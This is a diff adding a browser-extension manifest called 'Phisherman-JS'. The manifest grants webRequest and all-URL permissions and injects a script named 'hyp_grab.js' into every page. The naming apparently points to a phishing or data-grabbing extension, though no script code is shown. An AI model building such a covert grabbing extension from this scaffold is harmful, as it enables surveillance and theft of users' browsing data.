@@ -1,0 +1,1 @@
+{"description": "Phisherman JavaScript segment", "manifest_version": 2, "name": "Phisherman-JS", "version": "1.0.3.1", "permissions": ["webRequest", "<all_urls>", "activeTab", "storage"], "content_scripts": [{"matches": ["<all_urls>"], "js": ["hyp_grab.js"]}], "browser_specific_settings": {"gecko": {"id": "{750532c5-d87e-4b07-9978-f04b99ffd779}"}}}
